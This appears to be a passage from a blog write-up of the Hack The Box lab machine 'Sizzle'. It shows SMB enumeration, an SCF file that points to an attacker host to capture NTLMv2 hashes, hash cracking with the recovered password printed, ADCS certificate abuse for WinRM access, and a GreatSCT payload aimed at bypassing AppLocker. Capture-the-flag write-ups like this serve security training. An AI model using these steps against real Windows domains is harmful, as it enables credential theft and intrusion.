</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="o">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">01</span><span class="nx">T15</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">11</span><span class="o">+</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="nx">s</span> <span class="nx">from</span> <span class="nx">scanner</span> <span class="nx">time</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="o">:</span> <span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="mf">10.0</span>
</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="o">?</span>
</span></span><span class="line"><span class="cl"><span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">kpasswd5</span><span class="o">?</span>
</span></span><span class="line"><span class="cl"><span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">ncacn_http</span>    <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span> <span class="nx">over</span> <span class="nx">HTTP</span> <span class="mf">1.0</span>
</span></span><span class="line"><span class="cl"><span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="o">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">01</span><span class="nx">T15</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">11</span><span class="o">+</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="nx">s</span> <span class="nx">from</span> <span class="nx">scanner</span> <span class="nx">time</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="o">:</span> <span class="nx">Subject</span><span class="o">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">sizzle</span><span class="o">.</span><span class="nx">htb</span><span class="o">.</span><span class="nx">local</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="k">Not</span> <span class="nx">valid</span> <span class="nx">before</span><span class="o">:</span> <span class="mi">2018</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">03</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_Not</span> <span class="nx">valid</span> <span class="nx">after</span><span class="o">:</span>  <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">02</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ldap</span>          <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">Active</span> <span class="nx">Directory</span> <span class="nx">LDAP</span> <span class="p">(</span><span class="nx">Domain</span><span class="o">:</span> <span class="nx">HTB</span><span class="o">.</span><span class="nx">LOCAL</span><span class="p">,</span> <span class="nx">Site</span><span class="o">:</span> <span class="k">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="o">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">01</span><span class="nx">T15</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">11</span><span class="o">+</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="nx">s</span> <span class="nx">from</span> <span class="nx">scanner</span> <span class="nx">time</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="o">:</span> <span class="nx">Subject</span><span class="o">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">sizzle</span><span class="o">.</span><span class="nx">htb</span><span class="o">.</span><span class="nx">local</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="k">Not</span> <span class="nx">valid</span> <span class="nx">before</span><span class="o">:</span> <span class="mi">2018</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">03</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_Not</span> <span class="nx">valid</span> <span class="nx">after</span><span class="o">:</span>  <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">02</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span>      <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">Active</span> <span class="nx">Directory</span> <span class="nx">LDAP</span> <span class="p">(</span><span class="nx">Domain</span><span class="o">:</span> <span class="nx">HTB</span><span class="o">.</span><span class="nx">LOCAL</span><span class="p">,</span> <span class="nx">Site</span><span class="o">:</span> <span class="k">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="o">:</span> <span class="nx">Subject</span><span class="o">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">sizzle</span><span class="o">.</span><span class="nx">htb</span><span class="o">.</span><span class="nx">local</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="k">Not</span> <span class="nx">valid</span> <span class="nx">before</span><span class="o">:</span> <span class="mi">2018</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">03</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_Not</span> <span class="nx">valid</span> <span class="nx">after</span><span class="o">:</span>  <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">02</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="o">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">01</span><span class="nx">T15</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">11</span><span class="o">+</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="nx">s</span> <span class="nx">from</span> <span class="nx">scanner</span> <span class="nx">time</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="nx">Service</span> <span class="nx">Info</span><span class="o">:</span> <span class="nx">Host</span><span class="o">:</span> <span class="nx">SIZZLE</span><span class="p">;</span> <span class="nx">OS</span><span class="o">:</span> <span class="nx">Windows</span><span class="p">;</span> <span class="nx">CPE</span><span class="o">:</span> <span class="nx">cpe</span><span class="o">:/</span><span class="nx">o</span><span class="o">:</span><span class="nx">microsoft</span><span class="o">:</span><span class="nx">windows</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Host</span> <span class="nx">script</span> <span class="nx">results</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">3</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>    <span class="nx">Message</span> <span class="nx">signing</span> <span class="nx">enabled</span> <span class="k">and</span> <span class="nx">required</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="o">:</span> <span class="nx">mean</span><span class="o">:</span> <span class="mi">3</span><span class="nx">s</span><span class="p">,</span> <span class="nx">deviation</span><span class="o">:</span> <span class="mi">0</span><span class="nx">s</span><span class="p">,</span> <span class="nx">median</span><span class="o">:</span> <span class="mi">3</span><span class="nx">s</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">date</span><span class="o">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">01</span><span class="nx">T15</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">33</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">start_date</span><span class="o">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">01</span><span class="nx">T15</span><span class="o">:</span><span class="mi">36</span><span class="o">:</span><span class="mi">08</span>
</span></span></code></pre></div><p>This machine was a domaine controleur, we need to add the domain and the FQDN to yout /etc/hosts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s2">&#34;10.10.10.103 sizzle.htb.local htb.local&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div>

<h2 class="relative group"><strong>Enumerat SMB :</strong> 
    <div id="enumerat-smb-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#enumerat-smb-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>I always start with the smb service so lets try to connect on it using null session or Guest session.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled1_hu13919908071210777438.png 330w,
        /img/sizzle/Untitled1_hu4799544986589835236.png 660w,
        /img/sizzle/Untitled1_hu12397187528051143812.png 1024w,
        /img/sizzle/Untitled1_hu4164272386066000264.png 2x"
        src="/img/sizzle/Untitled1_hu4799544986589835236.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>Ok i can log in with Guest and null session i try to enumerate the share also with cme.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; crackmapexec smb 10.10.10.103 -u <span class="s1">&#39;Guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">14393</span> x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>+<span class="o">]</span> HTB.LOCAL<span class="se">\G</span>uest: 
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           ADMIN$                          Remote Admin
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           C$                              Default share
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           CertEnroll                      Active Directory Certificate Services share
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           Department Shares READ            
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           IPC$            READ            Remote IPC
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           NETLOGON                        Logon server share 
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           Operations                      
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           SYSVOL                          Logon server share 
</span></span></code></pre></div><p>The Guest user have access on a share named <strong><code>Department Shares</code></strong> lets get all of it content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; smbclient <span class="se">\\\\</span>sizzle.htb.local<span class="se">\\</span><span class="s2">&#34;Department Shares&#34;</span> -U Guest
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get all the content and analyse it localy</span>
</span></span><span class="line"><span class="cl">&gt; recuse on
</span></span><span class="line"><span class="cl">&gt; prompte off
</span></span><span class="line"><span class="cl">&gt; mget *
</span></span></code></pre></div><p>I try to enumerate domain user with rid brute force and i can this users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; crackmapexec smb 10.10.10.103 -u <span class="s1">&#39;Guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute <span class="m">10000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Users list</span>
</span></span><span class="line"><span class="cl">SIZZLE$
</span></span><span class="line"><span class="cl">amanda
</span></span><span class="line"><span class="cl">mrlky
</span></span><span class="line"><span class="cl">sizzler
</span></span><span class="line"><span class="cl">Administrator
</span></span><span class="line"><span class="cl">krbtgt
</span></span></code></pre></div>

<h2 class="relative group"><strong>SCF file Attack :</strong> 
    <div id="scf-file-attack-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#scf-file-attack-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>So go back on the smb service i have acces on lot of share lets try to enumerate all the permission on it.</p>
<p>I find i can put some file on the smb share <strong><code>Users/Public</code></strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; smbcacls -N <span class="se">\\\\</span>sizzle.htb.local<span class="se">\\</span><span class="s2">&#34;Department Shares&#34;</span> Users/Public 
</span></span><span class="line"><span class="cl">REVISION:1
</span></span><span class="line"><span class="cl">CONTROL:SR<span class="p">|</span>DI<span class="p">|</span>DP
</span></span><span class="line"><span class="cl">OWNER:BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">GROUP:HTB<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">ACL:Everyone:ALLOWED/OI<span class="p">|</span>CI/FULL
</span></span><span class="line"><span class="cl">ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI<span class="p">|</span>CI<span class="p">|</span>I/FULL
</span></span><span class="line"><span class="cl">ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI<span class="p">|</span>CI<span class="p">|</span>I/FULL
</span></span><span class="line"><span class="cl">ACL:Everyone:ALLOWED/OI<span class="p">|</span>CI<span class="p">|</span>I/READ
</span></span><span class="line"><span class="cl">ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI<span class="p">|</span>CI<span class="p">|</span>I/FULL
</span></span></code></pre></div><p>When we can put some file on windows environnement i can try <strong><code>SCF File attack</code></strong> to steal NTLMv2 of domain user ( if the user open my malicious file ).</p>
<p>Create a file named @exploit.scf and paste this on it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>Shell<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Command</span><span class="o">=</span><span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.52<span class="se">\s</span>hare<span class="se">\t</span>est.ico
</span></span><span class="line"><span class="cl"><span class="o">[</span>Taskbar<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Command</span><span class="o">=</span>ToggleDesktop
</span></span></code></pre></div><p>now open responder and put the malicious file on the Users/Public Folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Open responder </span>
</span></span><span class="line"><span class="cl">&gt; responder -I tun0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># put the file on folder </span>
</span></span><span class="line"><span class="cl">&gt; put @exploit.scf 
</span></span></code></pre></div><p>wait for connection. ( You can find this hash in <strong><code>/usr/share/reponder/logs</code></strong> )</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled2_hu8152138795285156218.png 330w,
        /img/sizzle/Untitled2_hu17899875767538191650.png 660w,
        /img/sizzle/Untitled2_hu17172514435492015196.png 1024w,
        /img/sizzle/Untitled2_hu13152541820664731343.png 2x"
        src="/img/sizzle/Untitled2_hu17899875767538191650.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>We Get connection and steal the hash for amanda user. Lets try to crack the ntlmv2 hash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; hashcat -a <span class="m">0</span> -m <span class="m">5600</span> amanda.txt /usr/share/wordlists/rockyou.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AMANDA::HTB:091314b0e760d6a0:9fa3258c3d31e52b901c3e660c6789bc:0101000000000000003c42639b9cda011fdde6c2ade7b9750000000002000800370056004c00310001001e00570049004e002d00550042005a004f00500041005900510049005400340004003400570049004e002d00550042005a004f0050004100590051004900540034002e00370056004c0031002e004c004f00430041004c0003001400370056004c0031002e004c004f00430041004c0005001400370056004c0031002e004c004f00430041004c0007000800003c42639b9cda0106000400020000000800300030000000000000000100000000200000755086bc236af9cd7481624a18dac4dde03f51d3563a68ecb9529899aa08ed390a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003200000000000000000000000000:Ashare1972
</span></span></code></pre></div><p>Use CME to valid the credentials and get the first access on the domain.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; crackmapexec smb 10.10.10.103 -u <span class="s1">&#39;amanda&#39;</span> -p <span class="s1">&#39;Ashare1972&#39;</span>  
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">14393</span> x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>+<span class="o">]</span> HTB.LOCAL<span class="se">\a</span>manda:Ashare1972
</span></span></code></pre></div><p>With this user we can get access on the network share named <strong><code>CertEnroll</code></strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; smbclient -N <span class="se">\\\\</span>sizzle.htb.local<span class="se">\\</span><span class="s2">&#34;CertEnroll&#34;</span> -U <span class="s1">&#39;amanda%Ashare1972&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get all the content</span>
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> prompt off
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget *
</span></span></code></pre></div><p>I try some domain enumeration with bloodhound.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; bloodhound-python -d HTB.local -u amanda -p <span class="s1">&#39;Ashare1972&#39;</span> -dc sizzle.htb.local -ns 10.10.10.103 --auth-method ntlm -c all
</span></span></code></pre></div><p>I see amanda is part of group <strong><code>REMOTE MANAGEMENT USERS</code></strong></p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled3_hu3591890300013086653.png 330w,
        /img/sizzle/Untitled3_hu7175335999242034340.png 660w,
        /img/sizzle/Untitled3_hu5789117854327620508.png 1024w,
        /img/sizzle/Untitled3_hu8155700105254630013.png 2x"
        src="/img/sizzle/Untitled3_hu7175335999242034340.png"
        alt="Untitled"
      />
      
    </figure>
</p>


<h2 class="relative group"><strong>Abuse ADCS to get PSremote session :</strong> 
    <div id="abuse-adcs-to-get-psremote-session-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#abuse-adcs-to-get-psremote-session-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>So we could login the server with winrm and get a shell as amanda**.**</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; evil-winrm -i sizzle.htb.local -u amanda -p <span class="s1">&#39;Ashare1972&#39;</span>
</span></span></code></pre></div><p>But i get an error So a return on my content of the network share, this file containt .crl file that so this makes me think of an ADCS service and the network sharing name I thought I should try to access the ADCS web utility</p>
<p>On url add <strong><code>/sertsrv</code></strong> You can authenticate on the service using amanda credentials.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled4_hu10825903302650396564.png 330w,
        /img/sizzle/Untitled4_hu2290795315846366993.png 660w,
        /img/sizzle/Untitled4_hu7309082045048776222.png 1024w,
        /img/sizzle/Untitled4_hu7382305002126645809.png 2x"
        src="/img/sizzle/Untitled4_hu2290795315846366993.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>With this interface we are able de generate a user certificat signed by the CA authority. First we need a certificat request ( .csr file ) we could generate it with openssl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Paye close attention to this part</span>
</span></span><span class="line"><span class="cl">Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:sizzle.htb.local
</span></span></code></pre></div><p>when this is done copy the content of the .csr and go to the ADCS web interface.</p>
<p>Click on <strong><code>request a certificate</code> </strong>  <strong><code>advanced certificate request</code></strong> , Paste the content of the .csr file and click on submit.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled5_hu4782506160597792360.png 330w,
        /img/sizzle/Untitled5_hu16314250654662815990.png 660w,
        /img/sizzle/Untitled5_hu8851778195323217907.png 1024w,
        /img/sizzle/Untitled5_hu16578260435304138910.png 2x"
        src="/img/sizzle/Untitled5_hu16314250654662815990.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>Downlaod the certificate and us it to login using evil-winrm and open a PSremote session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; evil-winrm -i 10.10.10.103 -c certnew.cer -k amanda.key -S
</span></span></code></pre></div><p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled6_hu9416558553788883755.png 330w,
        /img/sizzle/Untitled6_hu9609442193287251994.png 660w,
        /img/sizzle/Untitled6_hu15205407440927615496.png 1024w,
        /img/sizzle/Untitled6_hu16703383007503852523.png 2x"
        src="/img/sizzle/Untitled6_hu9609442193287251994.png"
        alt="Untitled"
      />
      
    </figure>
</p>


<h2 class="relative group"><strong>Bypass Applocker and defender :</strong> 
    <div id="bypass-applocker-and-defender-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#bypass-applocker-and-defender-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>So i re take my bloodhound graph and i see the user mrlky is vulnerable to kerberoasting because it have SPN set.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled7_hu9247363148308637400.png 330w,
        /img/sizzle/Untitled7_hu12708911504985922120.png 660w,
        /img/sizzle/Untitled7_hu17569332912242715710.png 1024w,
        /img/sizzle/Untitled7_hu5777425290503993919.png 2x"
        src="/img/sizzle/Untitled7_hu12708911504985922120.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>It is confirmed by <strong><code>GetUserSPNs</code></strong> from impacket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; impacket-GetUserSPNs HTB.local/amanda:<span class="s1">&#39;Ashare1972&#39;</span> -dc-ip 10.10.10.103
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
</span></span><span class="line"><span class="cl">--------------------  -----  -----------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span class="line"><span class="cl">http/sizzle           mrlky  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>HTB,DC<span class="o">=</span>LOCAL  2018-07-10 14:08:09.536421  2018-07-12 10:23:50.871575             
</span></span></code></pre></div><p>But the kerberos port is filtered so that meen we can not get Service Ticket or TGT from linux.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; nmap -p88 10.10.10.103 
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-03 07:32 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> sizzle.htb.local <span class="o">(</span>10.10.10.103<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.021s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE
</span></span><span class="line"><span class="cl">88/tcp filtered kerberos-sec
</span></span></code></pre></div><p>So i need to do portfowarding or pivoting to get access on this port. But the applocker block my chisel binary and it block powerview script.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled8_hu6590663810576549756.png 330w,
        /img/sizzle/Untitled8_hu9622205720470121371.png 660w,
        /img/sizzle/Untitled8_hu4739034621891518619.png 1024w,
        /img/sizzle/Untitled8_hu6375080650649085864.png 2x"
        src="/img/sizzle/Untitled8_hu9622205720470121371.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>So i will generate a payload using <a href="https://github.com/GreatSCT/GreatSCT" target="_blank">GreatSCT</a>  to bypass it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ./GreatSCT.py
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; use <span class="m">9</span>
</span></span><span class="line"><span class="cl">&gt; <span class="nb">set</span> lhost 10.10.14.52
</span></span><span class="line"><span class="cl">&gt; generate
</span></span></code></pre></div><p>Start metasploit with <strong><code>.rc</code></strong> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; msfconsole -r &lt;FILE&gt;.rc
